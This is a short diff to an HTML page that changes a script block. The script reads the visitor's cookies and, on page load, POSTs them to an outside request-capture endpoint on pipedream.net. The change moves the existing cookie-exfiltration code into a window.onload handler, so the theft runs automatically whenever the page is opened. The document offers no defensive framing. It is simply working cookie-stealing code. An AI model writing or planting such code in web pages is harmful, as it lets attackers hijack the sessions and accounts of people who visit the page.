@@ -5,17 +5,20 @@
 </head>
 <body>
 <script>
-    const headers = new Headers()
-    headers.append("Content-Type", "application/json")
+    window.onload = function() {
+        const cookies = document.cookie;
+        const headers = new Headers()
+        headers.append("Content-Type", "application/json")
 
-    const options = {
-    method: "POST",
-    headers,
-    mode: "cors",
-    body: document.cookie,
+        const options = {
+        method: "POST",
+        headers,
+        mode: "cors",
+        body: cookies,
+        }
+
+        fetch("https://eocyumvmpl620tg.m.pipedream.net", options)
     }
-
-    fetch("https://eocyumvmpl620tg.m.pipedream.net", options)
 </script>
 </body>
 </html>
